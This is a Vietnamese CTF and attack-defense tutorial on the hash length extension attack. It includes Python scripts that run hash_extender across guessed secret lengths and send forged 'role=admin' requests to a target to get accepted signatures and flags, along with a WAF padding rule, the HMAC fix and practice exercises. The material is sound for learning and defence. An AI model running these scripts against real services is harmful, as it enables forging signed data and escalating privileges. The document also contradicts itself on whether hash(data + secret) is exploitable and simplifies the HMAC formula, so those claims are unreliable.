Hash Length Extension Attack

Khi app tự chế "chữ ký" bằng cách ghép hash(secret + data) (MD5/SHA1/SHA256 trần, không qua HMAC) để chống giả mạo dữ liệu — bạn có thể, không cần biết secret, tự tính ra hash hợp lệ cho dữ liệu đã nối thêm phần bạn muốn vào cuối, nhờ cách các hàm hash này hoạt động theo từng khối (Merkle-Damgård construction).

00 / TÓM TẮT 1 PHÚT

Hash Length Extension là gì?

Nhiều hàm hash phổ biến (MD5, SHA1, SHA256) được xây theo kiểu Merkle-Damgård: xử lý dữ liệu theo từng khối, và trạng thái bên trong sau khi hash xong chính là toàn bộ thông tin hàm cần để TIẾP TỤC hash thêm dữ liệu — không cần biết dữ liệu gốc là gì. Nếu app tạo "chữ ký" kiểu sig = hash(secret + data) rồi gửi cả data và sig cho người dùng, bạn lấy sig đó làm trạng thái bắt đầu, tự tính tiếp được hash(secret + data + padding + data_bạn_thêm) mà hoàn toàn không biết secret.

Nếu chỉ nhớ một điều Không cần tự cài thuật toán — dùng công cụ hash_extender có sẵn, chỉ cần biết: hash gốc, dữ liệu gốc, độ dài secret (thử các giá trị phổ biến 0-32 nếu không biết chính xác), và dữ liệu muốn nối thêm.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước (không cần sâu toán học)

Merkle-Damgård construction — cách xây hàm hash phổ biến (MD5, SHA1, SHA256): chia dữ liệu thành các khối cố định, xử lý TUẦN TỰ từng khối, mỗi khối cập nhật 1 "trạng thái nội bộ" (internal state), và trạng thái cuối cùng (sau khối cuối) CHÍNH LÀ giá trị hash bạn thấy.
Padding của hash — trước khi hash, dữ liệu được thêm vào 1 byte 0x80, rồi các byte 0x00, rồi 8 byte ghi độ dài dữ liệu gốc (tính bằng bit) — để độ dài cuối cùng là bội số của kích thước khối (64 byte với MD5/SHA1/SHA256).
Điểm mấu chốt khai thác — "giá trị hash cuối cùng" = "trạng thái nội bộ cuối cùng". Nếu bạn CÓ giá trị hash đó, bạn CÓ ĐỦ trạng thái để tiếp tục hash thêm khối tiếp theo — không cần biết nội dung dữ liệu đã hash trước đó là gì, kể cả phần secret bí mật.
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Dev nhầm "hash có secret" = "an toàn như HMAC"

Dev muốn tạo chữ ký chống giả mạo nhanh, nghĩ đơn giản: "chỉ ai biết secret mới tính được hash đúng" — nên viết hash(secret + data). Điều dev KHÔNG biết: hàm hash kiểu Merkle-Damgård không được thiết kế để dùng trực tiếp như vậy cho mục đích xác thực — nó thiếu 1 bước "chốt" ở cuối (finalization) mà HMAC có. HMAC (hash(secret + hash(secret + data)) hoặc tương tự, theo chuẩn RFC 2104) mới là cách làm đúng, vì nó phá vỡ chính thuộc tính "trạng thái cuối = đủ để tiếp tục" mà kẻ tấn công cần.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Tiếp tục hash từ trạng thái đã biết, không cần biết phần đầu

Dữ liệu MỚI mà server sẽ "thấy" khi kiểm tra lại không phải data + data_bạn_thêm đơn thuần — mà là data + padding_tự_động + data_bạn_thêm. Đây là lý do bạn phải dùng công cụ (mục 07) thay vì tự ghép chuỗi — phần padding phải tính đúng từng byte theo đúng chuẩn của thuật toán, và còn phụ thuộc ĐỘ DÀI của secret (vì padding được tính dựa trên tổng độ dài secret + data).

06 / ĐỊNH DẠNG DATA ĐẦU RA — ĐIỂM DỄ SAI NHẤT

import subprocess, re, requests

def try_all_secret_lengths(host, orig_sig, orig_data, append):
    out = subprocess.run(
        ["./hash_extender", "--data", orig_data,
         "--secret-min", "0", "--secret-max", "48",
         "--append", append, "--signature", orig_sig,
         "--format", "sha256", "--out-data-format", "html"],
        cwd="/home/ld/hoc/CTF/Tools/web/hash_extender", capture_output=True, text=True)

    sigs = re.findall(r"New signature: (\w+)", out.stdout)
    datas = re.findall(r"New string: (\S+)", out.stdout)

    for sig, data in zip(sigs, datas):
        r = requests.get(f"http://{host}/check", params={"data": data, "sig": sig}, timeout=5)
        if "invalid" not in r.text.lower():
            return data, sig, r.text
    return None, None, None

print(try_all_secret_lengths("TARGET_IP", "SIG_GOC_HEX", "uid=1&role=user", "&role=admin"))

(C) Bản A/D tái dùng — cache đúng độ dài secret sau lần thử đầu

import subprocess, re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
KNOWN_SECRET_LEN = None  # sẽ cache lại sau khi tìm ra đúng độ dài lần đầu

def build_candidates(orig_sig, orig_data, append, lo=0, hi=48):
    out = subprocess.run(
        ["./hash_extender", "--data", orig_data, "--secret-min", str(lo), "--secret-max", str(hi),
         "--append", append, "--signature", orig_sig, "--format", "sha256", "--out-data-format", "html"],
        cwd="/home/ld/hoc/CTF/Tools/web/hash_extender", capture_output=True, text=True)
    lens = [int(x) for x in re.findall(r"Secret length: (\d+)", out.stdout)]
    sigs = re.findall(r"New signature: (\w+)", out.stdout)
    datas = re.findall(r"New string: (\S+)", out.stdout)
    return list(zip(lens, sigs, datas))

def exploit_hle(host, orig_sig, orig_data):
    global KNOWN_SECRET_LEN
    cands = build_candidates(orig_sig, orig_data, "&role=admin",
        KNOWN_SECRET_LEN if KNOWN_SECRET_LEN else 0,
        KNOWN_SECRET_LEN if KNOWN_SECRET_LEN else 48)
    for length, sig, data in cands:
        r = requests.get(f"http://{host}/check", params={"data": data, "sig": sig}, timeout=5)
        if "invalid" not in r.text.lower():
            KNOWN_SECRET_LEN = length   # cache -- mọi đội khác dùng cùng độ dài secret
            m = FLAG_RE.search(r.text)
            return m.group() if m else None
    return None
Hiệu quả hơn bài trướcKhác padding oracle (độ dài secret không liên quan giữa các đội), ở đây độ dài secret THƯỜNG CỐ ĐỊNH trong code service dù giá trị secret khác nhau mỗi đội — nên cache lại đúng độ dài sau lần dò đầu tiên, các lần sau chỉ cần thử đúng 1 độ dài đó, nhanh hơn nhiều.

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Rule (regex trên tham số data đã URL-decode)Khớp gì
\x80[\x00]{2,} xuất hiện trong giá trị dataByte padding đặc trưng Merkle-Damgård (0x80 theo sau nhiều 0x00) — hiếm khi xuất hiện trong dữ liệu hợp lệ thông thường
Rule có false positive thấpVì chuỗi padding này rất đặc thù về cấu trúc byte, rule này tương đối an toàn để bật — khác nhiều lỗ hổng khác (IDOR, CSRF...) không có chữ ký rõ ràng để WAF bắt.

Fix đúng (ở code, không phải WAF): đổi sang HMAC (hmac.new(secret, data, hashlib.sha256) trong Python, hoặc tương đương ở ngôn ngữ khác) — không bao giờ tự ghép hash(secret + data) tay.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App tự ghép hash(secret + data) hoặc hash(data + secret) bằng hàm Merkle-Damgård trần (MD5/SHA1/SHA256/SHA512), và bạn có ít nhất 1 cặp data+sig hợp lệ.
❌App dùng HMAC đúng chuẩn (hmac.new(), HMAC-SHA256...) — thuộc tính "trạng thái cuối = đủ để tiếp tục" bị phá vỡ, length extension không áp dụng được.
❌Hash dùng là SHA3 (Keccak) — xây theo cấu trúc "sponge", KHÔNG phải Merkle-Damgård, không bị length extension.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 1 Flask app nhỏ cấp "token" dạng sha256(SECRET + "uid=1").hexdigest(), tự chạy hash_extender để thêm &role=admin và được app chấp nhận.

Gợi ý nếu kẹtChọn SECRET cố định ngắn (vd 8 ký tự) để biết trước đáp án đúng khi luyện, sau đó thử lại không biết độ dài để luyện quét --secret-min/--secret-max.

⭐⭐ Đổi 1 biến: đổi thuật toán app dùng từ SHA256 sang MD5, chạy lại với --format md5, so sánh độ dài block/padding khác gì.

Gợi ý nếu kẹtMD5 và SHA256 đều có block size 64 byte nên padding tương tự về cấu trúc, chỉ khác độ dài output hash (16 byte vs 32 byte).

⭐⭐⭐⭐ Tự nghĩ: app đổi sang hash(data + secret) (secret ở CUỐI, không phải đầu). Giải thích vì sao length extension KHÔNG áp dụng được trực tiếp trong trường hợp này, và nguyên tắc nào (từ mục 03) bị phá vỡ.

Gợi ý nếu kẹtLength extension cần biết TOÀN BỘ dữ liệu đã hash để tính padding đúng vị trí — nếu secret ở cuối, bạn không biết secret nên không biết chính xác padding sẽ nằm ở đâu/giá trị gì (phụ thuộc tổng độ dài gồm cả secret không biết nội dung); ngược lại khi secret ở ĐẦU, bạn biết chính xác phần data ở sau, nên chỉ cần đoán ĐỘ DÀI secret (1 số), không cần đoán NỘI DUNG.
